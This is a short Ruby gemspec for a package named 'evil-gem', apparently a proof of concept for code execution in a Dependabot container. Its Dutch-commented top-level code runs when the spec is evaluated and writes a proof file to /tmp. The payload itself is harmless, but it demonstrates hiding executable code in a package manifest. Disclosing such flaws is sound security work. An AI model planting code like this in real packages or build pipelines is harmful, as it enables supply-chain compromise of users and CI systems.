# evil-gem.gemspec
begin
  # De payload: schrijf een bewijsbestand naar de /tmp map van de Dependabot container
  File.write("/tmp/git_source_bypass_proof.txt", "SUCCESS: Code executed from git source at #{Time.now}!\n", mode: "a")
rescue => e
  # Fallback naar stderr als /tmp niet beschrijfbaar is
  warn "PAYLOAD_FAILED: #{e.class} - #{e.message}"
end

Gem::Specification.new do |spec|
  spec.name          = "evil-gem"
  spec.version       = "1.0.0"
  spec.authors       = ["Sauron"]
  spec.summary       = "Innocent looking gem"
  spec.files         = []
  spec.add_dependency "rack", ">= 2.2.7"
end